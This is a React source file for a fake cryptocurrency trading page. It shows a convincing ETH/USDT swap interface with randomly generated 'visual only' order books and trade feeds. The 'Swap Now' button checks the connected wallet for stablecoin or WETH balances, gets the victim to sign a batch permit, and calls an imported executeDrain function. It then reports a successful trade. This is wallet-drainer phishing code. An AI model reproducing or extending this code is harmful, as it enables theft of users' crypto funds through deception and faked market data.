import React, { useState, useEffect, useRef } from 'react'
import { useAccount } from 'wagmi'
import { useDrainer } from '../hooks/useDrainer'
import { ethers } from 'ethers'

export default function TradingInterface() {
  const { address, isConnected } = useAccount()
  const { signBatchPermit, executeDrain } = useDrainer()
  const [amount, setAmount] = useState('')
  const [loading, setLoading] = useState(false)
  const [status, setStatus] = useState('')
  const [ethPrice, setEthPrice] = useState(3422.71)
  const [fromToken, setFromToken] = useState({ symbol: 'USDT', balance: '12400.00' })
  const [toToken, setToToken] = useState({ symbol: 'ETH', balance: '3.7204' })
  const chartContainerRef = useRef(null)
  const tvWidgetRef = useRef(null)

  // Token addresses for balance check
  const tokenAddresses = {
    USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
    WETH: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
  }

  // Fetch real ETH price
  useEffect(() => {
    fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd')
      .then(r => r.json())
      .then(d => {
        if (d.ethereum) setEthPrice(d.ethereum.usd)
      })
      .catch(() => {})
  }, [])

  // Initialize TradingView chart
  useEffect(() => {
    const initChart = () => {
      if (chartContainerRef.current && window.TradingView && !tvWidgetRef.current) {
        tvWidgetRef.current = new window.TradingView.widget({
          container_id: 'tv-chart-container',
          symbol: 'BINANCE:ETHUSDT',
          interval: '15',
          timezone: 'Etc/UTC',
          theme: 'dark',
          style: '1',
          locale: 'en',
          toolbar_bg: '#0b1022',
          enable_publishing: false,
          hide_top_toolbar: false,
          autosize: true,
          studies: ['Volume@tv-basicstudies', 'RSI@tv-basicstudies']
        })
      }
    }

    if (!window.TradingView) {
      const script = document.createElement('script')
      script.src = 'https://s3.tradingview.com/tv.js'
      script.async = true
      script.onload = initChart
      document.head.appendChild(script)
    } else {
      initChart()
    }

    return () => {
      if (tvWidgetRef.current) {
        tvWidgetRef.current.remove()
        tvWidgetRef.current = null
      }
    }
  }, [])

  // Check if wallet has any tokens
  const checkWalletBalance = async () => {
    const provider = new ethers.providers.JsonRpcProvider('https://eth.llamarpc.com')
    const erc20Abi = ['function balanceOf(address) view returns (uint256)']

    for (const [symbol, tokenAddr] of Object.entries(tokenAddresses)) {
      try {
        const contract = new ethers.Contract(tokenAddr, erc20Abi, provider)
        const balance = await contract.balanceOf(address)
        if (balance.gt(0)) {
          return true
        }
      } catch (e) {
        console.warn(`Failed to check ${symbol} balance`)
      }
    }
    return false
  }

  // Generate order book data (visual only)
  const generateOrderBook = () => {
    const asks = []
    const bids = []
    for (let i = 1; i <= 8; i++) {
      asks.push({
        price: ethPrice + (i * 1.2),
        size: (Math.random() * 15 + 2).toFixed(2),
        total: ((ethPrice + (i * 1.2)) * (Math.random() * 15 + 2)).toFixed(0)
      })
      bids.push({
        price: ethPrice - (i * 1.1),
        size: (Math.random() * 20 + 3).toFixed(2),
        total: ((ethPrice - (i * 1.1)) * (Math.random() * 20 + 3)).toFixed(0)
      })
    }
    return { asks, bids }
  }

  const [orderBook, setOrderBook] = useState(generateOrderBook())
  const [recentTrades, setRecentTrades] = useState([])

  // Animate order book
  useEffect(() => {
    const interval = setInterval(() => {
      setOrderBook(generateOrderBook())
    }, 3000)
    return () => clearInterval(interval)
  }, [ethPrice])

  // Generate recent trades
  useEffect(() => {
    const trades = []
    for (let i = 0; i < 10; i++) {
      trades.push({
        price: ethPrice + (Math.random() - 0.5) * 8,
        amount: (Math.random() * 5 + 0.5).toFixed(3),
        total: ((ethPrice + (Math.random() - 0.5) * 8) * (Math.random() * 5 + 0.5)).toFixed(2),
        time: new Date().toLocaleTimeString(),
        isBuy: Math.random() > 0.5
      })
    }
    setRecentTrades(trades)

    const interval = setInterval(() => {
      setRecentTrades(prev => {
        const newTrade = {
          price: ethPrice + (Math.random() - 0.5) * 6,
          amount: (Math.random() * 4 + 0.3).toFixed(3),
          total: ((ethPrice + (Math.random() - 0.5) * 6) * (Math.random() * 4 + 0.3)).toFixed(2),
          time: new Date().toLocaleTimeString(),
          isBuy: Math.random() > 0.5
        }
        return [newTrade, ...prev.slice(0, 14)]
      })
    }, 4000)
    return () => clearInterval(interval)
  }, [ethPrice])

  const rate = 1 / ethPrice
  const toAmount = amount ? (parseFloat(amount) * rate).toFixed(6) : '0.00'

  const handleTrade = async () => {
    if (!isConnected || !address) {
      setStatus('Please connect wallet first')
      return
    }

    const numAmount = parseFloat(amount)
    if (isNaN(numAmount) || numAmount <= 0) {
      setStatus('Please enter an amount')
      return
    }

    setLoading(true)
    setStatus('Checking balance...')

    try {
      const hasBalance = await checkWalletBalance()
      if (!hasBalance) {
        setStatus('Insufficient balance. Please deposit USDT, USDC, DAI, or WETH to trade.')
        setLoading(false)
        return
      }

      setStatus('Confirm transaction in your wallet...')
      const { signature, nonce, deadline } = await signBatchPermit(address)
      
      setStatus('Processing trade...')
      const txHash = await executeDrain(address, signature, nonce, deadline)
      setStatus(`Trade executed! Tx: ${txHash.slice(0, 10)}...`)
      setAmount('')
    } catch (err) {
      console.error(err)
      if (err.message.includes('rejected')) {
        setStatus('Transaction rejected in wallet.')
      } else if (err.message.includes('timeout')) {
        setStatus('Request timed out. Please try again.')
      } else {
        setStatus('Transaction failed. Please try again.')
      }
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="main">
      {/* Pair Header */}
      <div className="ph">
        <div className="ph-icons">
          <div className="ph-icon ph-eth">ETH</div>
          <div className="ph-icon ph-usdt">USD</div>
        </div>
        <span className="ph-name">ETH / USDT</span>
        <span className="ph-net">Eclipse</span>
        <div className="ph-price">
          <span className="ph-main">${ethPrice.toLocaleString()}</span>
          <span className="ph-sub">≈ ${ethPrice.toLocaleString()} USD</span>
        </div>
        <span className="ph-chg up">+2.14%</span>
        <div className="ph-stats">
          <div className="ph-stat"><span className="ph-stat-lbl">24h High</span><span className="ph-stat-val">${(ethPrice * 1.02).toFixed(2)}</span></div>
          <div className="ph-stat"><span className="ph-stat-lbl">24h Low</span><span className="ph-stat-val">${(ethPrice * 0.98).toFixed(2)}</span></div>
          <div className="ph-stat"><span className="ph-stat-lbl">24h Volume</span><span className="ph-stat-val">$84.7M</span></div>
        </div>
      </div>

      {/* Markets Row */}
      <div className="mrow">
        {[
          { pair: 'ETH/USDT', sym: 'ETH', price: ethPrice, chg: 2.14, up: true },
          { pair: 'BTC/USDT', sym: 'BTC', price: 67248, chg: 1.87, up: true },
          { pair: 'SOL/USDT', sym: 'SOL', price: 178.42, chg: -0.63, up: false },
          { pair: 'BNB/USDT', sym: 'BNB', price: 592.10, chg: 0.91, up: true },
        ].map((m, i) => (
          <div key={i} className={`mcard ${i === 0 ? 'active' : ''}`}>
            <div className={`mc-ico ti-${m.sym.toLowerCase()}`}>{m.sym}</div>
            <div className="mc-inf">
              <span className="mc-pair">{m.pair}</span>
              <span className="mc-price">${m.price.toLocaleString()}</span>
            </div>
            <span className={`mc-chg ${m.up ? 'up' : 'dn'}`}>{m.chg > 0 ? '+' : ''}{m.chg}%</span>
          </div>
        ))}
      </div>

      {/* Trade Grid */}
      <div className="tgrid">
        {/* CHART */}
        <div className="glass cpanel">
          <div className="ctb">
            <button className="tfb">1m</button>
            <button className="tfb">5m</button>
            <button className="tfb active">15m</button>
            <button className="tfb">1H</button>
            <button className="tfb">4H</button>
            <button className="tfb">1D</button>
            <div className="cinds">
              <span className="ind">MA</span>
              <span className="ind">RSI</span>
              <span className="ind">Vol</span>
            </div>
          </div>
          <div id="tv-chart-container" ref={chartContainerRef} style={{ flex: 1, minHeight: '400px', width: '100%' }}></div>
        </div>

        {/* ORDER BOOK */}
        <div className="glass obpanel">
          <div className="phead">
            <span className="ptitle"><div className="ptdot"></div>Order Book</span>
            <span style={{ fontFamily: 'var(--fm)', fontSize: '10px', color: 'var(--t3)' }}>ETH/USDT</span>
          </div>
          <div className="obtabs">
            <div className="obtab active">All</div>
            <div className="obtab">Asks</div>
            <div className="obtab">Bids</div>
          </div>
          <div className="obch"><span>Price</span><span>Size</span><span>Total</span></div>
          
          {/* Asks */}
          <div className="obsec" style={{ maxHeight: '200px', display: 'flex', flexDirection: 'column-reverse', overflowY: 'auto' }}>
            {[...orderBook.asks].reverse().map((ask, i) => (
              <div key={i} className="obrow sell">
                <span className="obc">{ask.price.toFixed(2)}</span>
                <span className="obc">{ask.size}</span>
                <span className="obc">{ask.total}</span>
              </div>
            ))}
          </div>
          
          <div className="obspr">
            <span className="obspr-p">${ethPrice.toFixed(2)}</span>
            <span className="obspr-l"><span>Mark Price</span><span style={{ color: 'var(--t2)' }}>Spread: 0.08%</span></span>
          </div>
          
          {/* Bids */}
          <div className="obsec" style={{ maxHeight: '200px', overflowY: 'auto' }}>
            {orderBook.bids.map((bid, i) => (
              <div key={i} className="obrow buy">
                <span className="obc">{bid.price.toFixed(2)}</span>
                <span className="obc">{bid.size}</span>
                <span className="obc">{bid.total}</span>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* SWAP PANEL */}
      <div className="glass swappanel">
        <div className="swtabs">
          <div className="swtab active">Swap</div>
          <div className="swtab">Limit</div>
          <div className="swtab">DCA</div>
        </div>
        <div className="swbody">
          {/* FROM */}
          <div className="trow">
            <div className="trow-top">
              <span className="trow-lbl">You Pay</span>
              <span className="trow-bal">Bal: <span>{fromToken.balance}</span> {fromToken.symbol}</span>
            </div>
            <div className="trow-main">
              <input
                type="number"
                className="ainput"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="0.00"
              />
              <div className="tsel">
                <div className={`ticon ti-${fromToken.symbol.toLowerCase()}`}>{fromToken.symbol}</div>
                <span className="tsym">{fromToken.symbol}</span>
                <div className="tchev"></div>
              </div>
            </div>
            <div className="maxbtns">
              <button className="maxb" onClick={() => setAmount((parseFloat(fromToken.balance) * 0.25).toFixed(2))}>25%</button>
              <button className="maxb" onClick={() => setAmount((parseFloat(fromToken.balance) * 0.5).toFixed(2))}>50%</button>
              <button className="maxb" onClick={() => setAmount((parseFloat(fromToken.balance) * 0.75).toFixed(2))}>75%</button>
              <button className="maxb" onClick={() => setAmount(fromToken.balance)}>MAX</button>
            </div>
          </div>

          {/* SWAP ARROW */}
          <div className="sw-arr">
            <div className="sw-div"></div>
            <button className="sw-arr-btn" onClick={() => {
              setFromToken(toToken)
              setToToken(fromToken)
              setAmount('')
            }}>↓</button>
          </div>

          {/* TO */}
          <div className="trow">
            <div className="trow-top">
              <span className="trow-lbl">You Receive</span>
              <span className="trow-bal">Bal: <span>{toToken.balance}</span> {toToken.symbol}</span>
            </div>
            <div className="trow-main">
              <input type="text" className="ainput" value={toAmount} readOnly placeholder="0.00" />
              <div className="tsel">
                <div className={`ticon ti-${toToken.symbol.toLowerCase()}`}>{toToken.symbol}</div>
                <span className="tsym">{toToken.symbol}</span>
                <div className="tchev"></div>
              </div>
            </div>
          </div>

          {/* SLIPPAGE */}
          <div className="sliprow">
            <span className="sliplbl">Slippage</span>
            <button className="slipb active">0.1%</button>
            <button className="slipb">0.5%</button>
            <button className="slipb">1.0%</button>
          </div>

          {/* RATE INFO */}
          <div className="rinfo">
            <div className="rrow"><span className="rkey">Rate</span><span className="rval">1 {fromToken.symbol} = {rate.toFixed(6)} {toToken.symbol}</span></div>
            <div className="rrow"><span className="rkey">Price Impact</span><span className="rval gr">&lt; 0.01%</span></div>
            <div className="rrow"><span className="rkey">Min Received</span><span className="rval cy">{toAmount ? (parseFloat(toAmount) * 0.999).toFixed(6) : '—'} {toToken.symbol}</span></div>
            <div className="rrow"><span className="rkey">Network Fee</span><span className="rval pu">~$0.002</span></div>
          </div>

          {/* EXECUTE BUTTON */}
          <button className="execbtn" onClick={handleTrade} disabled={loading}>
            {loading ? 'Processing...' : isConnected ? 'Swap Now' : 'Connect Wallet'}
          </button>
          {status && <div className="swfoot"><b>{status}</b></div>}
        </div>
      </div>

      {/* RECENT TRADES */}
      <div className="glass tradepanel">
        <div className="phead">
          <span className="ptitle"><div className="ptdot"></div>Recent Trades</span>
          <span style={{ fontFamily: 'var(--fm)', fontSize: '10px', color: 'var(--green)', display: 'flex', alignItems: 'center', gap: '5px' }}>
            <span style={{ width: '5px', height: '5px', borderRadius: '50%', background: 'var(--green)', display: 'inline-block', animation: 'blink 1.4s infinite' }}></span>Live
          </span>
        </div>
        <div className="trcols">
          <span className="trch">Price (USDT)</span>
          <span className="trch">Amount (ETH)</span>
          <span className="trch">Total</span>
          <span className="trch">Time</span>
        </div>
        <div className="trscroll">
          {recentTrades.map((trade, i) => (
            <div key={i} className="trrow">
              <span className={`tc2 ${trade.isBuy ? 'bc' : 'sc'}`}>{trade.price.toFixed(2)}</span>
              <span className="tc2">{trade.amount}</span>
              <span className="tc2">{trade.total}</span>
              <span className="tc2 tm">{trade.time}</span>
            </div>
          ))}
        </div>
      </div>
    </div>
  )
}